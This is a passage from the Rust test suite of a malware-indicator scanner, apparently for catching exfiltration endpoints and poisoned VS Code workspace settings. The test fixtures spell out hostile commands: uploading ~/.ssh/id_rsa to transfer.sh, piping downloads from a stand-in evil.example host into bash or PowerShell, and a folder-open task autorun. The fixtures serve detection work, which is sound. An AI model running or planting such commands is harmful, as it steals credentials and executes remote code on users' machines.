        std::fs::write(tmp.join("big.bin"), &content).unwrap();
        let paths = [PathBuf::from("big.bin")];
        let findings = scan_paths_in_root(&tmp, paths.iter());
        assert!(
            findings.is_empty(),
            "needle past cap should be a documented miss: {findings:#?}"
        );
        std::fs::remove_dir_all(&tmp).ok();
    }

    #[test]
    fn discord_legacy_webhook_url_trips_rule() {
        // Older Discord domain — same threat, common in droppers that
        // were written before discord.com became canonical.
        let bytes = b"fetch('https://discordapp.com/api/webhooks/9/abc', {body})";
        let hits = matches_content("any.js", bytes);
        assert!(
            hits.iter().any(|r| r.id == "exfil.discord-legacy-webhook"),
            "got: {:?}",
            hits.iter().map(|r| r.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn interactsh_oast_trips_rule() {
        let bytes = b"const exfil = 'https://abcdef.interact.sh/'";
        let hits = matches_content("steal.py", bytes);
        assert!(hits.iter().any(|r| r.id == "exfil.interactsh"));
    }

    #[test]
    fn oastify_burp_collaborator_trips_rule() {
        let bytes = b"requests.post('https://abc.oastify.com', data=dump)";
        let hits = matches_content("postinstall.py", bytes);
        assert!(hits.iter().any(|r| r.id == "exfil.oastify"));
    }

    #[test]
    fn transfer_sh_trips_rule() {
        let bytes = b"curl --upload-file ~/.ssh/id_rsa https://transfer.sh/key";
        let hits = matches_content("setup.sh", bytes);
        assert!(hits.iter().any(|r| r.id == "exfil.transfer-sh"));
    }

    #[test]
    fn requestrepo_trips_rule() {
        let bytes = b"url = 'https://xyz.requestrepo.com/r'";
        let hits = matches_content("any.ts", bytes);
        assert!(hits.iter().any(|r| r.id == "exfil.requestrepo"));
    }

    #[test]
    fn pipedream_webhook_subdomain_trips_rule_but_bare_apex_does_not() {
        // Webhook-shaped URL → hit.
        let dirty = b"axios.post('https://eo123.m.pipedream.net', payload)";
        let hits = matches_content("dropper.js", dirty);
        assert!(
            hits.iter().any(|r| r.id == "exfil.pipedream-webhook"),
            "webhook subdomain must trip rule"
        );
        // Bare `pipedream.net` (tutorial mention, README link to the
        // marketing site) → no hit. Documents the deliberate FP
        // mitigation we chose over needling the apex.
        let benign = b"See https://pipedream.com or https://pipedream.net for the platform docs.";
        let benign_hits = matches_content("README.md", benign);
        assert!(
            !benign_hits
                .iter()
                .any(|r| r.id == "exfil.pipedream-webhook"),
            "bare apex must not trip rule (FP mitigation)"
        );
    }

    #[test]
    fn vscode_tasks_folder_open_autorun_trips_rule_in_tasks_json() {
        // The exact key the VSCode tasks.json schema documents for
        // "run when the folder is opened" — the workspace-poison
        // primitive a poisoned `.vscode/` ships.
        let dirty =
            br#"{ "version": "2.0.0", "tasks": [{ "label": "x", "command": "evil.sh", "runOptions": { "runOn": "folderOpen" } }] }"#;
        let hits = matches_content("tasks.json", dirty);
        assert!(
            hits.iter()
                .any(|r| r.id == "vscode.tasks-folderopen-autorun"),
            "got: {:?}",
            hits.iter().map(|r| r.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn vscode_tasks_rule_is_basename_scoped_to_tasks_json() {
        // Same string in a file that isn't `tasks.json` should not
        // trip — keeps the surface tight against accidental mentions
        // in unrelated docs / configs.
        let dirty = br#"someConfig = "\"runOn\": \"folderOpen\"""#;
        let hits = matches_content("README.md", dirty);
        assert!(
            !hits
                .iter()
                .any(|r| r.id == "vscode.tasks-folderopen-autorun"),
            "rule must be basename-scoped: {:?}",
            hits.iter().map(|r| r.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn catalog_ids_are_unique() {
        let mut ids: Vec<&str> = catalog().iter().map(|r| r.id).collect();
        ids.sort();
        let original = ids.len();
        ids.dedup();
        assert_eq!(ids.len(), original, "catalog rule ids must be unique");
    }

    // --- settings.json terminal autorun (rule #27) -----------------------

    #[test]
    fn jsonc_normaliser_strips_line_and_block_comments_and_trailing_commas() {
        let input = br#"{
            // a line comment
            "a": 1, /* a block
                       comment */
            "b": [1, 2, 3,],
            "url": "https://example.com/foo//bar",
        }"#;
        let out = jsonc_to_json(input);
        let v: serde_json::Value = serde_json::from_slice(&out).unwrap();
        assert_eq!(v["a"], 1);
        assert_eq!(v["b"], serde_json::json!([1, 2, 3]));
        // `//` inside a string must survive — otherwise the URL gets
        // mangled.
        assert_eq!(v["url"], "https://example.com/foo//bar");
    }

    #[test]
    fn terminal_autorun_fires_on_co_occurring_shell_flag_and_downloader() {
        let body = br#"{
          "terminal.integrated.profiles.linux": {
            "evil": {
              "path": "/bin/bash",
              "args": ["-c", "curl https://evil.example/x | sh"]
            }
          }
        }"#;
        assert!(detect_terminal_autorun_downloader(body));
    }

    #[test]
    fn terminal_autorun_fires_on_powershell_encoded_command() {
        let body = br#"{
          "terminal.integrated.profiles.windows": {
            "shim": {
              "path": "pwsh.exe",
              "args": ["-Command", "iwr https://evil.example/x | iex"]
            }
          }
        }"#;
        assert!(detect_terminal_autorun_downloader(body));
    }

    #[test]
    fn terminal_autorun_does_not_fire_on_legitimate_login_shell() {
        // `bash --login` is the canonical legitimate use of a shell-
        // exec flag in a terminal profile; the absence of a
        // downloader/eval token is what keeps the rule from firing.
        let body = br#"{
          "terminal.integrated.profiles.linux": {
            "bash-login": {
              "path": "/bin/bash",
              "args": ["-c", "exec /usr/bin/tmux new -A -s main"]
            }
          }
        }"#;
        assert!(!detect_terminal_autorun_downloader(body));
    }

    #[test]
    fn terminal_autorun_requires_co_occurrence_in_same_profile() {
        // Shell flag in one profile, downloader in another — must
        // NOT fire. The rule's whole point is that the dangerous
        // combination is the same profile's args.
        let body = br#"{
          "terminal.integrated.profiles.linux": {
            "a": { "args": ["-c", "exec tmux"] },
            "b": { "args": ["curl https://example.com"] }
          }
        }"#;
        assert!(!detect_terminal_autorun_downloader(body));
    }

    #[test]
    fn terminal_autorun_handles_jsonc_comments_in_settings() {
        let body = br#"{
            // VS Code workspace settings - JSONC, not strict JSON.
            "terminal.integrated.profiles.osx": {
                /* a malicious profile someone could review-bomb in */
                "trojan": {
                    "path": "/bin/zsh",
                    "args": ["-c", "wget -q -O - https://evil.example/x | bash"],
                },
            },
        }"#;
        assert!(detect_terminal_autorun_downloader(body));
    }

    #[test]
    fn terminal_autorun_rule_is_scoped_to_workspace_paths() {
        // `.vscode/settings.json` is in scope; an arbitrary
        // `settings.json` anywhere else (user settings, library
        // config) is not — and matches() must still skip the
        // structural variant entirely because it has no bytes.
        assert!(path_in_scope_for_structural(Path::new(
            ".vscode/settings.json"
        )));
        assert!(path_in_scope_for_structural(Path::new(
            "subdir/.cursor/settings.json"
        )));
        assert!(!path_in_scope_for_structural(Path::new(
            "src/foo/settings.json"
        )));
        assert!(!path_in_scope_for_structural(Path::new(
            "Library/Application Support/Code/User/settings.json"
        )));
        // Path-only `matches()` must not return the structural rule.
        let hits = matches(Path::new(".vscode/settings.json"));
        assert!(
            !hits.iter().any(|r| r.id.starts_with("editor-extension.")),
            "structural rules must require bytes; matches() saw {:?}",
            hits.iter().map(|r| r.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn scan_paths_in_root_fires_structural_rule_with_finding() {
        use std::fs;
        let tmp =
            std::env::temp_dir().join(format!("sakimori-iocs-settings-{}", std::process::id()));
        let _ = fs::remove_dir_all(&tmp);
        fs::create_dir_all(tmp.join(".vscode")).unwrap();
        fs::write(
            tmp.join(".vscode/settings.json"),
            br#"{
              "terminal.integrated.profiles.linux": {
                "boot": {
                  "path": "/bin/bash",
                  "args": ["-c", "curl https://evil.example/x | bash"]
                }
              }
            }"#,
        )
        .unwrap();
        let findings = scan_paths_in_root(&tmp, [Path::new(".vscode/settings.json")].iter());
        let ids: Vec<_> = findings.iter().map(|f| f.rule_id).collect();
        assert!(
            ids.contains(&"editor-extension.terminal-profile-autorun-downloader"),
            "expected structural rule to fire; got {ids:?}"
        );
        let _ = fs::remove_dir_all(&tmp);
    }
}
